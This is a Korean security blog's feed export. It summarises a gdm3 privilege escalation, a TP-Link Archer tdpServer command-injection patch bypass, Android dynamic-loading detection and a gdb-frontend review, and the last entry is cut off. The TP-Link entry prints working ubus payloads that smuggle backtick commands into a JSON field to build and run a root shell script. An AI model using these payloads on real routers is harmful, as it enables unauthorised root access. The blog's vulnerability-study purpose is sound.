  
  <entry>
    <title>[하루한줄] CVE-2020-16125: Local Privilege Escalation (LPE) in Ubuntu gdm3</title>
    <link href="/2020/11/10/l0ch/2020-11-10/"/>
    <url>/2020/11/10/l0ch/2020-11-10/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://securitylab.github.com/advisories/GHSL-2020-202-gdm3-LPE-unresponsive-accounts-daemon">Local Privilege Escalation (LPE) in Ubuntu gdm3 - CVE-2020-16125</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>gdm version &#x2264; 3.36.3-0ubuntu0.20.04.1</p><p>accountsservice version &#x2264; 0.6.55-0ubuntu12 ~ 20.04.1</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>gdm3&#xC5D0;&#xC11C; &#xC2DC;&#xC2A4;&#xD15C; &#xAD8C;&#xD55C;&#xC758; &#xACC4;&#xC815;&#xC744; &#xB9CC;&#xB4E4;&#xC5B4; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9;&#xC774; &#xAC00;&#xB2A5;&#xD55C; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>gdm3(gnome display manager)&#xC740; &#xADF8;&#xB798;&#xD53D; &#xC778;&#xD130;&#xD398;&#xC774;&#xC2A4;&#xB85C; &#xB85C;&#xADF8;&#xC778; &#xBC0F; &#xC0AC;&#xC6A9;&#xC790; &#xC778;&#xC99D;&#xC744; &#xCC98;&#xB9AC;&#xD558;&#xB294;&#xB370;, &#xC0C8;&#xB85C; &#xC124;&#xCE58;&#xB41C; &#xC2DC;&#xC2A4;&#xD15C; &#xB4F1;&#xC758; &#xC774;&#xC720;&#xB85C; &#xC0AC;&#xC6A9;&#xC790; &#xACC4;&#xC815;&#xC744; &#xCC3E;&#xC744; &#xC218; &#xC5C6;&#xC744; &#xB54C; <code>gnome-initial-setup</code> &#xC744; &#xD638;&#xCD9C;&#xD558;&#xACE0; sudo &#xADF8;&#xB8F9;&#xC758; &#xC0C8;&#xB85C;&#xC6B4; &#xACC4;&#xC815;&#xC744; &#xB9CC;&#xB4E4; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>gdm3&#xC5D0;&#xC11C;&#xB294; &#xAE30;&#xC874; &#xACC4;&#xC815;&#xC744; &#xCC3E;&#xAE30; &#xC704;&#xD574; D-Bus &#xBA54;&#xC18C;&#xB4DC; &#xD638;&#xCD9C;&#xC744; &#xC0AC;&#xC6A9;&#xD574; <code>accountsservice</code> &#xB370;&#xBAAC;&#xC758; <code>look_for_existing_users_sync</code> &#xC5D0;&#xC11C; &#xAE30;&#xC874; &#xC0AC;&#xC6A9;&#xC790; &#xBAA9;&#xB85D;&#xC744; &#xAC00;&#xC838;&#xC635;&#xB2C8;&#xB2E4;. &#xC774;&#xB54C; &#xC11C;&#xBE44;&#xC2A4; &#xAC70;&#xBD80; &#xACF5;&#xACA9;&#xC73C;&#xB85C; <code>accountsservice</code> &#xB370;&#xBAAC;&#xC774; &#xC751;&#xB2F5;&#xD558;&#xC9C0; &#xC54A;&#xB3C4;&#xB85D; &#xD558;&#xBA74; D-Bus &#xBA54;&#xC18C;&#xB4DC; &#xD638;&#xCD9C;&#xC774; &#xC2DC;&#xAC04; &#xCD08;&#xACFC;&#xB85C; &#xC778;&#xD574; &#xC5F0;&#xACB0;&#xC774; &#xC2E4;&#xD328;&#xD558;&#xACE0; <code>priv&#x2192;have_existing_user_accounts</code> &#xC758; &#xAE30;&#xBCF8;&#xAC12;&#xC778; false&#xAC00; &#xC720;&#xC9C0;&#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xD6C4;<code>wants_initial_setup</code> &#xC5D0;&#xC11C; <code>priv&#x2192;have_existing_user_accounts</code>&#xAC00; false&#xBA74; gdm3&#xB294; &#xD604;&#xC7AC; &#xC2DC;&#xC2A4;&#xD15C;&#xC5D0; &#xACC4;&#xC815;&#xC774; &#xC5C6;&#xB294; &#xAC83;&#xC73C;&#xB85C; &#xC778;&#xC2DD;&#xD558;&#xACE0; <code>gnome-initial-setup</code>&#xC744; &#xD638;&#xCD9C;&#xD574; &#xC2DC;&#xC2A4;&#xD15C; &#xAD8C;&#xD55C;&#xC758; &#xACC4;&#xC815;&#xC744; &#xC0DD;&#xC131;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC758; &#xD328;&#xCE58;&#xB294; <code>priv-&gt;have_existing_user_accounts</code>&#xC758; &#xAE30;&#xBCF8;&#xAC12;&#xC744; true&#xB85C; &#xC218;&#xC815;&#xD558;&#xB294; &#xAC83;&#xC73C;&#xB85C; &#xC801;&#xC6A9;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>lpe</tag>
      
      <tag>eop</tag>
      
      <tag>ubuntu</tag>
      
      <tag>L0ch</tag>
      
      <tag>gdm3</tag>
      
      <tag>accountsservice</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-10882 Bypass</title>
    <link href="/2020/11/09/idioth/2020-11-09/"/>
    <url>/2020/11/09/idioth/2020-11-09/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://github.com/rdomanski/Exploits_and_Advisories/blob/master/advisories/Pwn2Own/Tokyo2020/minesweeper.md">Pwn2Own Tokyo2020</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>tdpServer daemon(<em>/usr/bin/tdpServer</em>) running on TP-Link Archer A7 and C7(AC1750), hardware version 5, MIPS Arch, firmware ver.200721 and 200628</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; &#xB77C;&#xC6B0;&#xD130;&#xC758; LAN&#xC5D0; &#xC788;&#xB294; &#xACF5;&#xACA9;&#xC790;&#xB9CC; &#xC545;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xC9C0;&#xB9CC; &#xD2B9;&#xBCC4;&#xD55C; &#xC778;&#xC99D;&#xC774; &#xD544;&#xC694;&#xD558;&#xC9C0; &#xC54A;&#xC740; &#xCDE8;&#xC57D;&#xC810;&#xC785;&#xB2C8;&#xB2E4;.</p><p>CVE-200-10882&#xC5D0;&#xC11C; <code>system(systemCmd)</code>&#xC5D0; &#xC758;&#xD574; Command Injection &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xC874;&#xC7AC;&#xD558;&#xC600;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; <code>system()</code> &#xC0AC;&#xC6A9; &#xB300;&#xC2E0; lua &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB97C; &#xC774;&#xC6A9;&#xD558;&#xC5EC; <code>lua_onemesh_call(slave_mac)</code>&#xC744; &#xD1B5;&#xD574; &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xC2E4;&#xD589;&#xD568;&#xC73C;&#xB85C;&#xC368; &#xD328;&#xCE58;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. <code>lua_onemesh_call()</code>&#xC740; <code>luci.controller.admin.onemesh</code> lua &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xBA70; &#xC778;&#xC218;&#xB97C; &#xC804;&#xB2EC;&#xD558;&#xACE0; &#xC694;&#xCCAD;&#xB41C; &#xD568;&#xC218;&#xC758; &#xD578;&#xB4E4;&#xB7EC;&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xB294;  <code>dispatch</code>&#xB77C;&#xB294; &#xC774;&#xB984;&#xC758; &#xD2B9;&#xBCC4;&#xD55C; &#xD568;&#xC218;&#xB97C; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB54C; <code>sync_wifi_specified(slave_mac)</code>&#xC774; &#xC2E4;&#xD589;&#xB429;&#xB2C8;&#xB2E4;. <code>sync_wifi_specified()</code>&#xB294; &#xB9E4;&#xAC1C; &#xBCC0;&#xC218;&#xB97C; <code>target_id</code>&#xB85C; <code>printf</code>&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xAD6C;&#xC131;&#xB418;&#xBA70; json &#xB0B4;&#xC6A9;&#xC73C;&#xB85C; &#xC2E4;&#xC81C; &#xBA85;&#xB839;&#xC774; &#xC2E4;&#xD589;&#xB429;&#xB2C8;&#xB2E4;. json&#xC744; escape &#xD558;&#xBA74; root&#xB85C; &#xC2E4;&#xD589;&#xB418;&#xB294; lua script process&#xC5D0;&#xC11C; &#xBA85;&#xB839; &#xC2E4;&#xD589;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs json">ubus call sync sync_wifi &apos;{&quot;load&quot;:&quot;/tmp/onemesh_sync_wifi_tmp_json&quot;, &quot;timeout&quot;:5, &quot;target_id&quot;:&quot;&lt;Controlled_Parameter&gt;&quot;}&apos; &amp;</code></pre><p>slave_mac&#xC758; &#xACBD;&#xC6B0; <code>strncpy(slave_mac, *(char **)(iVar6 + 0x10), 0x11)</code>&#xB85C; &#xBCF5;&#xC0AC;&#xB418;&#xBA70; <code>memset(slave_mac, 0, 0x424)</code>&#xB85C; memset &#xB429;&#xB2C8;&#xB2E4;. &#xB610;&#xD55C; &#xBC14;&#xC774;&#xD2B8; &#xC815;&#xB82C;&#xB85C; &#xC778;&#xD558;&#xC5EC; slave_mac &#xBCC0;&#xC218;&#xB294; 0x12&#xB9CC;&#xD07C; &#xD560;&#xB2F9;&#xB418;&#xBA70; 17&#xC790;&#xAE4C;&#xC9C0; &#xBB38;&#xC790;&#xB97C; &#xC0BD;&#xC785;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs json">ubus call sync sync_wifi &apos;{&quot;load&quot;:&quot;/tmp/onemesh_sync_wifi_tmp_json&quot;,&quot;timeout&quot;:5,&quot;target_id&quot;:&quot;&apos;`printf &apos;;&apos;&gt;&gt;b`&apos;&quot;}&apos; &amp;ubus call sync sync_wifi &apos;{&quot;load&quot;:&quot;/tmp/onemesh_sync_wifi_tmp_json&quot;,&quot;timeout&quot;:5,&quot;target_id&quot;:&quot;&apos;`printf &apos;.&apos;&gt;&gt;b`&apos;&quot;}&apos; &amp;ubus call sync sync_wifi &apos;{&quot;load&quot;:&quot;/tmp/onemesh_sync_wifi_tmp_json&quot;,&quot;timeout&quot;:5,&quot;target_id&quot;:&quot;&apos;`printf &apos;/&apos;&gt;&gt;b`&apos;&quot;}&apos; &amp;ubus call sync sync_wifi &apos;{&quot;load&quot;:&quot;/tmp/onemesh_sync_wifi_tmp_json&quot;,&quot;timeout&quot;:5,&quot;target_id&quot;:&quot;&apos;`printf &apos;q&apos;&gt;&gt;b`&apos;&quot;}&apos; &amp;ubus call sync sync_wifi &apos;{&quot;load&quot;:&quot;/tmp/onemesh_sync_wifi_tmp_json&quot;,&quot;timeout&quot;:5,&quot;target_id&quot;:&quot;&apos;`sh b`&apos;&quot;}&apos; &amp;</code></pre>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>command injection</tag>
      
      <tag>idioth</tag>
      
      <tag>tp-link</tag>
      
      <tag>lua</tag>
      
      <tag>tdpserver</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Detecting Dynamic Loading in Android App</title>
    <link href="/2020/11/08/fabu1ous/2020-11-08/"/>
    <url>/2020/11/08/fabu1ous/2020-11-08/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://sayfer.io/blog/dynamic-loading-in-android-applications-with-proc-maps/">Detecting Dynamic Loading in Android Applications With /proc/maps</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Android 10 API 29 &#xC774;&#xC0C1; &#xBC84;&#xC804;</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Android application&#xC740; dynamic loading&#xC744; &#xD1B5;&#xD574; run-time &#xB3C4;&#xC911; &#xC5B4;&#xB290; &#xC2DC;&#xC810;&#xC5D0;&#xB77C;&#xB3C4; &#xCF54;&#xB4DC;&#xB97C; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0; &#xB85C;&#xB4DC;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. API level 29&#xBD80;&#xD134; &#xC774; dynamic loading&#xC744; &#xC545;&#xC6A9;&#xD574; apk&#xC758; &#xC815;&#xC801; &#xAC80;&#xC0AC;&#xB97C; &#xD53C;&#xD574; &#xAC00;&#xB294; &#xC545;&#xC131;&#xCF54;&#xB4DC;&#xB4E4;&#xC744; &#xB9C9;&#xAE30; &#xC704;&#xD574; apk&#xC5D0; &#xC18D;&#xD558;&#xC9C0; &#xC54A;&#xC740; &#xCF54;&#xB4DC;&#xC758; load&#xB97C; &#xB9C9;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; &#xC5EC;&#xC804;&#xD788; DexClassLoader&#xC5D0; &#xC758;&#xD55C; .dex &#xD30C;&#xC77C;&#xC758; dynamic loading&#xC774; &#xAC00;&#xB2A5;&#xD574; &#xC5EC;&#xC804;&#xD788; &#xC545;&#xC6A9;&#xC5D0; &#xC0AC;&#xC6A9;&#xB420; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xBAA8;&#xB4E0; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB294; &#xAC01;&#xAC01; <code>/proc/[PID]</code>&#xB77C;&#xB294; &#xB514;&#xB809;&#xD130;&#xB9AC;&#xB97C; &#xAC16;&#xACE0;, &#xADF8;&#xC911; <code>/proc/[PID]/maps</code>&#xB77C;&#xB294; &#xD30C;&#xC77C;&#xC740; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC758; &#xB9E4;&#xD551;&#xB41C; &#xBA54;&#xBAA8;&#xB9AC;&#xAC00; &#xAE30;&#xB85D;&#xB3FC;&#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.  &#xB530;&#xB77C;&#xC11C; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xAC00; &#xC5B4;&#xB5A0;&#xD55C; &#xD30C;&#xC77C;&#xC5D0; &#xC811;&#xADFC;&#xD558;&#xBA74; <code>/proc/[PID]/maps</code>&#xC5D0; &#xAE30;&#xB85D;&#xC774; &#xB0A8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774; &#xAE30;&#xB85D;&#xC744; &#xD1B5;&#xD574; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xAC00; <code>/data/data</code> &#xB514;&#xB809;&#xD130;&#xB9AC; &#xC18D; .dex &#xC811;&#xADFC; &#xC5EC;&#xBD80;&#xB97C; &#xAC80;&#xC0AC;&#xD574; dynamic loading&#xC744; &#xD0D0;&#xC9C0;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. </p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://developer.android.com/reference/dalvik/system/DexClassLoader">https://developer.android.com/reference/dalvik/system/DexClassLoader</a></p><p><a href="https://developer.android.com/about/versions/10/behavior-changes-10">https://developer.android.com/about/versions/10/behavior-changes-10</a></p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>android</tag>
      
      <tag>dynamic loading</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Research] gdb-frontend 포너블에 적합한가?</title>
    <link href="/2020/11/08/fabu1ous/gdb-frontend-review/"/>
    <url>/2020/11/08/fabu1ous/gdb-frontend-review/</url>
    
    <content type="html"><![CDATA[<h1 id="5&#xAC1C;&#xC6D4;-&#xBB35;&#xD78C;-&#xB9C1;&#xD06C;"><a href="#5&#xAC1C;&#xC6D4;-&#xBB35;&#xD78C;-&#xB9C1;&#xD06C;" class="headerlink" title="5&#xAC1C;&#xC6D4; &#xBB35;&#xD78C; &#xB9C1;&#xD06C;"></a>5&#xAC1C;&#xC6D4; &#xBB35;&#xD78C; &#xB9C1;&#xD06C;</h1><p><img src="/2020/11/08/fabu1ous/gdb-frontend-review/1.png" alt></p><p><img src="/2020/11/08/fabu1ous/gdb-frontend-review/2.png" alt></p><p>&#xBA87; &#xB2EC; &#xC804; Fandu&#xD615;&#xB2D8;&#xC774; &#xC9C1;&#xC811; &#xC0AC;&#xC6A9;&#xD574;&#xBCF4;&#xACE0; &#xD6C4;&#xAE30;&#xB97C; &#xC54C;&#xB824;&#xB2EC;&#xB77C;&#xB294; &#xB9D0;&#xACFC; &#xD568;&#xAED8; &#xB9C1;&#xD06C;&#xB97C; &#xD558;&#xB098; &#xB358;&#xC838;&#xC8FC;&#xC168;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD560; &#xC77C;&#xB3C4; &#xBB35;&#xD600;&#xB46C;&#xC57C; &#xC81C;&#xB9DB;! 5&#xB2EC; &#xB3D9;&#xC548; &#xACE0;&#xC774; &#xBAA8;&#xC154;&#xB193;&#xC740; GDBFrontend, &#xB625;&#xC778;&#xC9C0; &#xB41C;&#xC7A5;&#xC778;&#xC9C0; &#xCC0D;&#xC5B4; &#xBA39;&#xC5B4; &#xBD05;&#xC2DC;&#xB2E4;.</p><h1 id="&#xC124;&#xCE58;-&#xBC0F;-&#xC2E4;&#xD589;"><a href="#&#xC124;&#xCE58;-&#xBC0F;-&#xC2E4;&#xD589;" class="headerlink" title="&#xC124;&#xCE58; &#xBC0F; &#xC2E4;&#xD589;"></a>&#xC124;&#xCE58; &#xBC0F; &#xC2E4;&#xD589;</h1><p><a href="https://github.com/rohanrhu/gdb-frontend">rohanrhu/gdb-frontend</a></p><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> &lt;https://github.com/rohanrhu/gdb-frontend.git&gt; gdb-frontend<span class="hljs-built_in">cd</span> gdb-frontend./gdbfrontend</code></pre><p>&#xACF5;&#xC2DD; github&#xC5D0; &#xB098;&#xC640; &#xC788;&#xB294; &#xC124;&#xCE58; &#xBC29;&#xBC95;&#xC785;&#xB2C8;&#xB2E4;. &#xD130;&#xBBF8;&#xB110; &#xD0A4;&#xC2DC;&#xACE0; &#xADF8;&#xB300;&#xB85C; &#xC785;&#xB825;&#xD558;&#xC2DC;&#xBA74; &#xB418;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ol><li>GDB 8.2 &#xC774;&#xC0C1;</li><li>python3</li><li>tmux</li></ol><p>gdb-frontend&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xAE30; &#xC704;&#xD55C; &#xC694;&#xAD6C;&#xC0AC;&#xD56D;&#xC740; 3&#xAC00;&#xC9C0;&#xAC00; &#xC788;&#xB294;&#xB370;, &#xC9C0;&#xAE08; &#xC800;&#xC758; &#xD658;&#xACBD;&#xC740; Ubuntu 20.04&#xC774;&#xBBC0;&#xB85C; tmux&#xB9CC; &#xCD94;&#xAC00;&#xB85C; &#xC124;&#xCE58;&#xD574;&#xC8FC;&#xBA74; &#xD658;&#xACBD; &#xC138;&#xD305;&#xC740; &#xB05D;&#xC785;&#xB2C8;&#xB2E4;.</p><p><img src="/2020/11/08/fabu1ous/gdb-frontend-review/3.png" alt></p><p>gdb-frontend&#xB97C; &#xC2E4;&#xD589;&#xC2DC;&#xD0A8; &#xD6C4; &#xBE0C;&#xB77C;&#xC6B0;&#xC800;&#xB85C; <a href="http://127.0.0.1:5551/terminal/"><code>http://127.0.0.1:5551/terminal/</code></a>&#xC5D0;  &#xC811;&#xC18D;&#xD574;&#xC8FC;&#xC2DC;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;. <code>-w</code> &#xC635;&#xC158;&#xC73C;&#xB85C; working directory&#xB3C4; &#xC124;&#xC815;&#xD574; &#xC904; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h1 id="&#xD30C;&#xC774;&#xC5B4;-&#xD3ED;&#xC2A4;&#xB294;-&#xB098;&#xAC00;&#xC788;&#xC5B4;"><a href="#&#xD30C;&#xC774;&#xC5B4;-&#xD3ED;&#xC2A4;&#xB294;-&#xB098;&#xAC00;&#xC788;&#xC5B4;" class="headerlink" title="&#xD30C;&#xC774;&#xC5B4; &#xD3ED;&#xC2A4;&#xB294; &#xB098;&#xAC00;&#xC788;&#xC5B4;"></a>&#xD30C;&#xC774;&#xC5B4; &#xD3ED;&#xC2A4;&#xB294; &#xB098;&#xAC00;&#xC788;&#xC5B4;</h1><p><img src="/2020/11/08/fabu1ous/gdb-frontend-review/4.png" alt></p><p>&#xB9CC;&#xC57D; &#xD30C;&#xC774;&#xC5B4;&#xD3ED;&#xC2A4;&#xB97C; &#xC4F0;&#xACE0; &#xACC4;&#xC2E0;&#xB2E4;&#xBA74; &#xB2E4;&#xB978; &#xBE0C;&#xB77C;&#xC6B0;&#xC800;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC154;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;. gdb-frontend server&#xC640;&#xC758; &#xC5F0;&#xACB0;&#xC774; &#xACC4;&#xC18D; &#xB04A;&#xAE30;&#xAE38;&#xB798; &#xC6D0;&#xC778;&#xC744; &#xCC3E;&#xB290;&#xB77C; &#xC2DC;&#xAC04; &#xB0AD;&#xBE44;&#xB97C; &#xC880; &#xB9CE;&#xC774; &#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC790;&#xC8FC; &#xC560;&#xC6A9;&#xD558;&#xB294; gdb &#xD50C;&#xB7EC;&#xADF8;&#xC778; pwndbg&#xC640;&#xC758; &#xCDA9;&#xB3CC;&#xC774; &#xBB38;&#xC81C;&#xB77C; &#xC0DD;&#xAC01;&#xD574; pwndbg&#xB3C4; &#xC9C0;&#xC6CC;&#xBCF4;&#xACE0;, &#xC544;&#xC608; VM&#xC744; &#xC0C8;&#xB85C; &#xC0DD;&#xC131;&#xD574; &#xCC98;&#xC74C;&#xBD80;&#xD130; &#xB2E4;&#xC2DC; &#xD658;&#xACBD; &#xAD6C;&#xCD95;&#xD574;&#xBD24;&#xC9C0;&#xB9CC; &#xACB0;&#xAD6D; &#xD30C;&#xD3ED;&#xACFC;&#xC758; &#xD638;&#xD658; &#xBB38;&#xC81C;&#xC600;&#xB124;&#xC694;&#x2026;</p><p><a href="https://github.com/rohanrhu/gdb-frontend/issues/5">tmux.conf invalid settings problem &#xB7; Issue #5 &#xB7; rohanrhu/gdb-frontend</a></p><p><img src="/2020/11/08/fabu1ous/gdb-frontend-review/5.png" alt></p><h1 id="gui-&#xD6D1;&#xC5B4;&#xBCF4;&#xAE30;"><a href="#gui-&#xD6D1;&#xC5B4;&#xBCF4;&#xAE30;" class="headerlink" title="gui &#xD6D1;&#xC5B4;&#xBCF4;&#xAE30;"></a>gui &#xD6D1;&#xC5B4;&#xBCF4;&#xAE30;</h1><pre><code class="hljs bash">$ ./gdbfrontend -w /home/fabu1ous/Desktop/GDBFrontend v0.3.0-gitListening on 127.0.0.1: &lt;http://127.0.0.1:5551/&gt;Open this address <span class="hljs-keyword">in</span> web browser: &lt;http://127.0.0.1:5551/terminal/&gt;</code></pre><p>&#xBE0C;&#xB77C;&#xC6B0;&#xC800;&#xB85C; &#xC811;&#xC18D;&#xD55C; <a href="http://127.0.0.1:5551/terminal/"><code>http://127.0.0.1:5551/terminal/</code></a>&#xC758; &#xD654;&#xBA74;&#xC740; gdb shell&#xC774; &#xB744;&#xC6CC;&#xC9C4; terminal&#xACFC; gui &#xBD80;&#xBD84;&#xC73C;&#xB85C; &#xB098;&#xB269;&#xB2C8;&#xB2E4;. terminal &#xBD80;&#xBD84;&#xC740; gdb&#xC640; &#xB2E4;&#xB97C; &#xAC8C; &#xC5C6;&#xC73C;&#xB2C8; &#xB118;&#xC5B4;&#xAC00;&#xACE0;, gui&#xC758; &#xAE30;&#xBCF8;&#xC801;&#xC778; &#xAD6C;&#xC131;&#xACFC; &#xAE30;&#xB2A5; &#xC911; &#xC81C;&#xAC00; &#xC368;&#xBCF4;&#xBA74;&#xC11C; &#xC88B;&#xB2E4;&#xACE0; &#xB290;&#xB080; &#xC810;&#xB4E4;&#xC744; &#xC368;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>[ ! ] &#xAC1C;&#xBC1C;&#xC790;&#xC758; &#xAD00;&#xC810;&#xC5D0;&#xC11C; &#xB514;&#xBC84;&#xAC70;&#xB97C; &#xC368;&#xBCF8; &#xC801;&#xC774; &#xB2E8; &#xD55C; &#xBC88;&#xB3C4; &#xC5C6;&#xC73C;&#xB2C8; &#xC720;&#xC758;&#xD558;&#xC138;&#xC694;.</p><p><img src="/2020/11/08/fabu1ous/gdb-frontend-review/6.png" alt></p><p>&#xD568;&#xC218; &#xBCC4;&#xB85C; assembly &#xCF54;&#xB4DC;&#xB85C; &#xCD9C;&#xB825;&#xD574;&#xC8FC;&#xBA70; &#xB2E4;&#xC74C;&#xC5D0; &#xC2E4;&#xD589;&#xB420; &#xC778;&#xC2A4;&#xD2B8;&#xB7ED;&#xC158;&#xC740; &#xC5F0;&#xD55C; &#xC0C9;&#xC73C;&#xB85C; &#xD558;&#xC774;&#xB77C;&#xC774;&#xD2B8; &#xB429;&#xB2C8;&#xB2E4;. &#xADF8;&#xC911;&#xC5D0;&#xC11C;&#xB3C4; Call Stack 0&#xBC88;&#xC5D0; &#xB098;&#xD0C0;&#xB098;&#xB294; &#xD568;&#xC218;&#xC758; &#xD558;&#xC774;&#xB77C;&#xC774;&#xD2B8; &#xB41C; &#xBD80;&#xBD84;&#xC740; eip (&#xD639;&#xC740; rip)&#xC785;&#xB2C8;&#xB2E4;. &#xD604;&#xC7AC; &#xD504;&#xB85C;&#xADF8;&#xB7A8; &#xD750;&#xB984;&#xC758; &#xC704;&#xCE58;&#xB97C; &#xB300;&#xB2E8;&#xD788; &#xC9C1;&#xAD00;&#xC801;&#xC73C;&#xB85C; &#xC54C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xAE00;&#xC7AC;&#xC8FC;&#xAC00; &#xC5C6;&#xC5B4;&#xC11C; &#xC774;&#xB807;&#xAC8C;&#xBC16;&#xC5D0; &#xC124;&#xBA85;&#xC744; &#xBABB; &#xD558;&#xACA0;&#xB124;&#xC694;. &#x314E;&#x314E;</p><p><img src="/2020/11/08/fabu1ous/gdb-frontend-review/7.png" alt></p><p>break point&#xB294; instruction&#xC758; &#xC8FC;&#xC18C;&#xB97C; &#xD074;&#xB9AD;&#xD574;&#xC11C; &#xC0DD;&#xC131; &#xD639;&#xC740; &#xC0AD;&#xC81C;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC88C;&#xCE21;&#xC5D0; break point&#xB4E4;&#xC758; &#xBAA9;&#xB85D;&#xC744; &#xBCF4;&#xC5EC;&#xC8FC;&#xBA70; &#xCCB4;&#xD06C;&#xBC15;&#xC2A4;&#xB85C; &#xD65C;&#xC131;&#xD654; &#xC5EC;&#xBD80;&#xB97C; &#xBCC0;&#xACBD;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xAE30;&#xC874;&#xC5D0; &#xC0AC;&#xC6A9;&#xD558;&#xB358; pwndbg&#xC5D0;&#xC11C; &#xAC00;&#xC7A5; &#xC544;&#xC26C;&#xC6E0;&#xB358; &#xC810;&#xC774; &#xBC14;&#xB85C; break point &#xAD00;&#xB9AC;&#xAC00; &#xBC88;&#xAC70;&#xB86D;&#xB2E4;&#xB294; &#xAC83;&#xC778;&#xB370;, gdb-frontend&#xB294; GUI&#xB85C; &#xC774; &#xAE30;&#xB2A5;&#xC744; &#xC81C;&#xACF5;&#xD558;&#xB2C8; &#xC0C1;&#xB300;&#xC801;&#xC73C;&#xB85C; &#xC880; &#xB354; &#xD3B8;&#xB9AC;&#xD569;&#xB2C8;&#xB2E4;.</p><h1 id="&#xC4F8;-&#xAC00;&#xCE58;&#xAC00;-&#xC788;&#xB294;&#xAC00;"><a href="#&#xC4F8;-&#xAC00;&#xCE58;&#xAC00;-&#xC788;&#xB294;&#xAC00;" class="headerlink" title="&#xC4F8; &#xAC00;&#xCE58;&#xAC00; &#xC788;&#xB294;&#xAC00;?"></a>&#xC4F8; &#xAC00;&#xCE58;&#xAC00; &#xC788;&#xB294;&#xAC00;?</h1><p>&#xD655;&#xC7A5;&#xC131;&#xC774; &#xC88B;&#xB2E4;&#xB294; &#xC810;&#xC744; &#xB0B4;&#xC138;&#xC6B0;&#xACE0; &#xC788;&#xB294; &#xB9CC;&#xD07C; &#xC124;&#xBA85;&#xD560;&#xAC8C; &#xB9CE;&#xC9C4; &#xC54A;&#xB124;&#xC694;.</p><p>&#xC704;&#xC5D0;&#xC11C; &#xC124;&#xBA85;&#xD55C; &#xAC83;&#xB4E4;&#xC744; 